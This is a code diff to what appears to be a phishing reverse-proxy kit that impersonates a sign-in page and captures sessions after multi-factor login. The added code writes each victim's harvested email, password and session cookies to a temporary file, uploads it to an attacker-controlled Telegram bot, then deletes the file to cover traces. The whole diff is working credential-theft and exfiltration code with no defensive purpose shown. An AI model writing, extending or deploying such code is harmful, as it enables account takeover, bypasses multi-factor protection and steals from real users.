@@ -30,6 +30,34 @@ async function sendToTelegram(message) {
         console.error('[TELEGRAM] Failed:', error.message);
     }
 }
+
+async function sendDocumentToTelegram(filePath, caption) {
+    if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) return;
+    try {
+        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendDocument`;
+        const formData = new FormData();
+        formData.append('chat_id', TELEGRAM_CHAT_ID);
+        formData.append('caption', caption);
+        formData.append('document', {
+            uri: `file://${filePath}`,
+            type: 'text/plain',
+            name: path.basename(filePath)
+        });
+
+        const response = await fetch(url, {
+            method: 'POST',
+            body: formData
+        });
+        const result = await response.json();
+        if (!response.ok) {
+            console.error('[TELEGRAM DOC] API error:', result.description);
+        } else {
+            console.log('[TELEGRAM DOC] Document sent successfully');
+        }
+    } catch (error) {
+        console.error('[TELEGRAM DOC] Failed:', error.message);
+    }
+}
 // ==================== END TELEGRAM ====================
 
 const PROXY_ENTRY_POINT = "/login?method=signin&mode=secure&client_id=3ce82761-cb43-493f-94bb-fe444b7a0cc4&privacy=on&sso_reload=true";
@@ -457,13 +485,27 @@ if (!sessionData.alerted && hasValidSessionCookies(sessionData) && isPostLogin) 
     }));
     const cookiesJson = JSON.stringify(allCookies, null, 2);
 
-    const msg = `🚨 *Full Capture*\n\n` +
-                `📧 *Email:* ${credentials.email}\n` +
-                `🔑 *Password:* ${credentials.password}\n\n` +
-                `🍪 *All Cookies (JSON):*\n\`\`\`json\n${cookiesJson}\n\`\`\``;
+    // Write cookies to a temporary .txt file
+    const tempDir = path.join(__dirname, 'temp');
+    if (!fs.existsSync(tempDir)) {
+        fs.mkdirSync(tempDir);
+    }
+    const filePath = path.join(tempDir, `cookies_${Date.now()}.txt`);
+    fs.writeFileSync(filePath, cookiesJson, 'utf8');
 
-    sendToTelegram(msg).catch(err => console.error('Telegram send failed:', err));
+    // Build caption (email + password only)
+    const caption = `Full Capture\n\nEmail: ${credentials.email}\nPassword: ${credentials.password}`;
+
+    // Send document via Telegram
+    sendDocumentToTelegram(filePath, caption)
+        .catch(err => console.error('[TELEGRAM DOC] Send failed:', err.message));
+
     console.log(`[FINAL ALERT] MFA completed. Cookies captured.`);
+
+    // Clean up file after a short delay (optional, but recommended)
+    setTimeout(() => {
+        try { fs.unlinkSync(filePath); } catch (e) { /* ignore */ }
+    }, 10000); // delete after 10 seconds
 
     // Mark as alerted
     sessionData.alerted = true;
